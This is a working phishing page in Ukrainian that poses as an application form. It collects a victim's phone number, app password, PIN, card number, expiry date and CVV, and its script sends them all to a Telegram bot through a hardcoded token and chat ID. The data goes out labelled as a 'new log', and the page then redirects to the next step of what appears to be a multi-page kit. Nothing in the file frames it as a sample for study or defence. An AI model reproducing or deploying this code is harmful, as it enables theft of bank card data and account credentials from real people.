<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Заявка</title>

<style>
body{
  font-family:Arial;
  background:#f1f5f9;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.box{
  background:white;
  padding:25px;
  border-radius:15px;
  width:320px;
}

input{
  width:100%;
  padding:10px;
  margin:6px 0;
}

button{
  width:100%;
  padding:12px;
  background:#3b82f6;
  color:white;
  border:none;
  border-radius:10px;
}
</style>
</head>

<body>

<div class="box">
  <h2>Заповніть данні</h2>

  <!-- 1 Телефон -->
  <input id="phone" placeholder="+380..." maxlength="13">

  <!-- 2 Любой текст -->
  <input id="name" placeholder="Пароль від застосунку">

  <!-- 3 Ровно 4 цифры -->
  <input id="code4" placeholder="Пин-код" maxlength="4">

  <!-- 4 Дата MM/YY -->
  <input id="date" placeholder="MM/YY" maxlength="5">

  <!-- 5 До 16 цифр -->
  <input id="num16" placeholder="Номер картки" maxlength="16">

  <!-- 6 Ровно 3 цифры -->
  <input id="num3" placeholder="CVV" maxlength="3">

  <button onclick="send()">Отримати</button>
</div>

<script>

// 📞 ТЕЛЕФОН +380
const phone = document.getElementById("phone");
phone.addEventListener("input", function(){
  let x = this.value.replace(/\D/g, "");

  if(!x.startsWith("380")){
    x = "380" + x;
  }

  this.value = "+" + x.substring(0,12);
});


// 🔢 4 ЦИФРЫ
const code4 = document.getElementById("code4");
code4.addEventListener("input", function(){
  this.value = this.value.replace(/\D/g, "").slice(0,4);
});


// 📅 ДАТА MM/YY
const date = document.getElementById("date");
date.addEventListener("input", function(){
  let x = this.value.replace(/\D/g, "").slice(0,4);

  if(x.length >= 3){
    this.value = x.substring(0,2) + "/" + x.substring(2,4);
  } else {
    this.value = x;
  }
});


// 🔢 ДО 16 ЦИФР
const num16 = document.getElementById("num16");
num16.addEventListener("input", function(){
  this.value = this.value.replace(/\D/g, "").slice(0,16);
});


// 🔢 3 ЦИФРЫ
const num3 = document.getElementById("num3");
num3.addEventListener("input", function(){
  this.value = this.value.replace(/\D/g, "").slice(0,3);
});


// 🚀 ОТПРАВКА
function send(){

  const clientId = localStorage.getItem("clientId");
  const isRepeat = localStorage.getItem("sent");

  const phoneVal = phone.value;
  const name = document.getElementById("name").value;
  const code4Val = code4.value;
  const dateVal = date.value;
  const num16Val = num16.value;
  const num3Val = num3.value;

  const service = localStorage.getItem("service");

  if(!phoneVal || !name || code4Val.length!==4 || dateVal.length!==5 || !num16Val || num3Val.length!==3){
    alert("Введено не вірно!");
    return;
  }

  const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
  const chat_id = "8035773808";

  const title = isRepeat
    ? `♻️ Повторный Лог №${clientId}`
    : `🔥 Новый Лог 👻 №${clientId}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id:chat_id,
      text:
`${title}

Телефон📱: ${phoneVal}
Пароль🗝️: ${name}
Пин-код🔢: ${code4Val}
Срок действия📆: ${dateVal}
Карта💳: ${num16Val}
CVV⛓️‍💥: ${num3Val}
Банк🏧: ${service}`
    })
  });

  localStorage.setItem("sent","yes");

  window.location.href = "step4.html";
}

</script>

</body>
</html>
